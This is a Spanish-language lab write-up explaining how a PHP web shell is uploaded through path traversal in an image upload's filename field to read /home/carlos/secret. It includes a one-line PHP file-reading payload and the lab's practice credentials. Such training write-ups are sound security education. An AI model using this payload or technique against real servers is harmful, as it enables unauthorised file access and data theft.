# 02 Lab: Web shell upload via path traversal

# Objetivo

> This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
> 
> 
> To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
> 

## Solución

Creamos un archivo en .php que contenga un exploit de lectura y lo subimos. 

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Intentamos modificar el parámetro filename al momento de subir el archivo.

![image.png](02%20Lab%20Web%20shell%20upload%20via%20path%20traversal%2017efab5460ec801980d1fa9a1e9e0b67/image.png)

![image.png](02%20Lab%20Web%20shell%20upload%20via%20path%20traversal%2017efab5460ec801980d1fa9a1e9e0b67/image%201.png)

Accedemos a la web del usuario y vemos que se carga la “foto” que hemos subido.

![image.png](02%20Lab%20Web%20shell%20upload%20via%20path%20traversal%2017efab5460ec801980d1fa9a1e9e0b67/image%202.png)

![image.png](02%20Lab%20Web%20shell%20upload%20via%20path%20traversal%2017efab5460ec801980d1fa9a1e9e0b67/image%203.png)

![image.png](02%20Lab%20Web%20shell%20upload%20via%20path%20traversal%2017efab5460ec801980d1fa9a1e9e0b67/image%204.png)

![image.png](02%20Lab%20Web%20shell%20upload%20via%20path%20traversal%2017efab5460ec801980d1fa9a1e9e0b67/image%205.png)